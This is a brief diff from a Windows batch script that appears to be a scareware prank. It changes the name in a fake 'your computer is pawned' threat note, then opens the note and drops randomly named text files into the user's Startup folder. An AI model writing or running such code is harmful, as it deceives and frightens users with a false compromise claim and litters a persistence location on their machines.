@@ -40,7 +40,7 @@ goto loop1
 
 :2
 cd %temp%
-echo YOUR COMPUTER IS PAWNED BY ARAKELIAN... IF YOU RESTART YOUR COMPUTER IS DEAD :) > NOTE_araked.txt
+echo YOUR COMPUTER IS PAWNED BY GTAPIGOTLOXP... IF YOU RESTART YOUR COMPUTER IS DEAD :) > NOTE_araked.txt
 start NOTE_araked.txt
 cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 echo pranked > hehehe[%random%].txt
